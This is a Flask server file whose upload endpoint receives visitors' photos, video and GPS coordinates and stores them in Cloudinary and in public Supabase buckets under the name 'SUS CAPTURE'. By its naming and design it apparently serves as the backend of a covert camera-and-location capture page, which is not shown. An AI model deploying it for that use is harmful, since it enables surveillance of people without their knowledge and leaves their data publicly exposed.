import os
import uuid
from flask import Flask, request, jsonify, render_template, session
from flask_session import Session
from dotenv import load_dotenv
import cloudinary
import cloudinary.uploader
from supabase import create_client
import base64

# Load environment variables
load_dotenv()

app = Flask(__name__)

# Configure Flask session
app.config["SESSION_TYPE"] = "filesystem"
Session(app)

# Cloudinary configuration
cloudinary.config(
    cloud_name=os.getenv("CLOUDINARY_CLOUD_NAME"),
    api_key=os.getenv("CLOUDINARY_API_KEY"),
    api_secret=os.getenv("CLOUDINARY_API_SECRET"),
)

# Supabase Configuration
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_ANON_KEY = os.getenv("SUPABASE_ANON_KEY")
supabase_client = create_client(SUPABASE_URL, SUPABASE_ANON_KEY)
SUPABASE_BUCKET = "suscapture"

@app.route("/")
def index():
    """Render the main page"""
    return render_template("index.html")

@app.route("/upload", methods=["POST"])
def upload():
    """Handle media uploads (photo, video, location)"""

    # Generate unique user folder (e.g., user1, user2)
    if "user_id" not in session:
        session["user_id"] = f"user_{uuid.uuid4().hex[:6]}"  # Unique user folder
    user_folder = session["user_id"]

    cloudinary_folder = f"SUS CAPTURE/{user_folder}"
    supabase_folder = f"{user_folder}/"

    # Process image
    image_url, supabase_image_url = None, None
    image_file = request.files.get("image")
    if image_file:
        image_upload = cloudinary.uploader.upload(image_file, folder=cloudinary_folder)
        image_url = image_upload["secure_url"]
        
        supabase_client.storage.from_(SUPABASE_BUCKET).upload(f"{supabase_folder}image.jpg", image_file)
        supabase_image_url = f"{SUPABASE_URL}/storage/v1/object/public/{SUPABASE_BUCKET}/{supabase_folder}image.jpg"

    # Process video
    video_url, supabase_video_url = None, None
    video_file = request.files.get("video")
    if video_file:
        video_upload = cloudinary.uploader.upload(video_file, folder=cloudinary_folder, resource_type="video")
        video_url = video_upload["secure_url"]
        
        supabase_client.storage.from_(SUPABASE_BUCKET).upload(f"{supabase_folder}video.mp4", video_file)
        supabase_video_url = f"{SUPABASE_URL}/storage/v1/object/public/{SUPABASE_BUCKET}/{supabase_folder}video.mp4"

    # Process location data
    latitude = request.form.get("latitude")
    longitude = request.form.get("longitude")
    location_url, supabase_location_url = None, None
    if latitude and longitude:
        location_data = f"Latitude: {latitude}\nLongitude: {longitude}"
        location_filename = f"{user_folder}_location.txt"
        
        # Upload location to Cloudinary
        encoded_location = base64.b64encode(location_data.encode()).decode()
        location_upload = cloudinary.uploader.upload(
            f"data:text/plain;base64,{encoded_location}",
            folder=cloudinary_folder,
            public_id=location_filename,
            resource_type="raw"
        )
        location_url = location_upload["secure_url"]
        
        # Upload location to Supabase
        supabase_client.storage.from_(SUPABASE_BUCKET).upload(f"{supabase_folder}{location_filename}", location_data.encode())
        supabase_location_url = f"{SUPABASE_URL}/storage/v1/object/public/{SUPABASE_BUCKET}/{supabase_folder}{location_filename}"

    # Store metadata in Supabase table
    supabase_client.table("uploads").insert({
        "user_id": user_folder,
        "photo_url": image_url,
        "video_url": video_url,
        "supabase_photo_url": supabase_image_url,
        "supabase_video_url": supabase_video_url,
        "latitude": float(latitude) if latitude else None,
        "longitude": float(longitude) if longitude else None,
        "location_url": location_url,
        "supabase_location_url": supabase_location_url,
    }).execute()

    return jsonify({
        "image_url": image_url,
        "video_url": video_url,
        "supabase_image_url": supabase_image_url,
        "supabase_video_url": supabase_video_url,
        "location_url": location_url,
        "supabase_location_url": supabase_location_url
    })

if __name__ == "__main__":
    app.run(debug=True)
